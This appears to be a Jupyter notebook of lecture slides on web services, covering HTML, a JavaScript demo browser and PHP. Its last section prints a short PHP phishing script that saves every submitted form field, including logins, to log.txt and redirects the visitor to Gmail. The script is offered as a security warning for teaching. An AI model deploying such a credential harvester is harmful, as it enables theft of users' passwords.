{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Last Tango\n",
    "===\n",
    "Web Services\n",
    "---\n",
    "**1.** HTML, a.k.a. \"Tag Language\", fundamental but nothing we can expect"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**2.** + ```javascript```, better but still not enough"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "from IPython.display import HTML,clear_output, display\n",
    "import glob, os\n",
    "import ipywidgets as widgets\n",
    "\n",
    "files=glob.glob(\"demo/*.html\")\n",
    "\n",
    "def FileBrowse():\n",
    "    FileSel=widgets.Dropdown(\n",
    "       options=files,\n",
    "       value=files[0],\n",
    "       description='File:',\n",
    "    ) \n",
    "    S  = widgets.Box([widgets.Label(value='  ')],   layout=widgets.Layout(width='8%'))\n",
    "    button1=widgets.Button(description='Open',disabled=False,\n",
    "          button_style='',tooltip='Calculate',icon='check')\n",
    "    button1.style.button_color = '#f27318'\n",
    "    \n",
    "    def on_button_clicked(b): \n",
    "        FileName=FileSel.value\n",
    "        display(HTML('<div align=\"center\"><iframe src=%s width=\"90%%\", height=300></iframe></div>' %FileName))\n",
    "        clear_output(True)\n",
    "    button1.on_click(on_button_clicked)\n",
    "\n",
    "    return widgets.VBox(\n",
    "             [FileSel,\n",
    "              widgets.HBox([S,button1])\n",
    "             ])    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0e9db8cd16594c60a2cbb0f20bd7a89c"
      }
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div align=\"center\"><iframe src=demo/madlibs-js.html width=\"90%\", height=300></iframe></div>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "FileBrowse()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**3.** PHP: powerful as a **double - edged sword**, doing hard work and always suit our need, at least security: \n",
    "<img src=\"data/final.png\" width=100% />"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Phishing by PHP\n",
    "---\n",
    "According Wikimedia\n",
    "```\n",
    "Phishing, phone+fishing, is the attempt to obtain sensitive information such as usernames, passwords, and credit card details ...\n",
    "```\n",
    "Let us try the following PHP code, doing phishing:\n",
    "\n",
    "```php\n",
    "<?php\n",
    "   header ('Location:http://www.gmail.com');\n",
    "   $handle = fopen(\"log.txt\", \"a\");\n",
    "   foreach($_POST as $variable => $value) { \n",
    "\t   fwrite($handle, $variable); \n",
    "\t   fwrite($handle, \"=\");\n",
    "\t   fwrite($handle, $value); \n",
    "\t   fwrite($handle, \"\\r\\n\"); }\n",
    "   fwrite($handle,\"\\r\\n\");\n",
    "   fclose($handle);\n",
    "   exit;\n",
    "?>\n",
    "```\n",
    "\n",
    "which guide the user to go to gmail site and dub the data, if any login, under table to log.txt. \n",
    "\n",
    "```How do you not fall into this trap?```\n",
    "\n",
    "A long and hard trip on the lectures.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
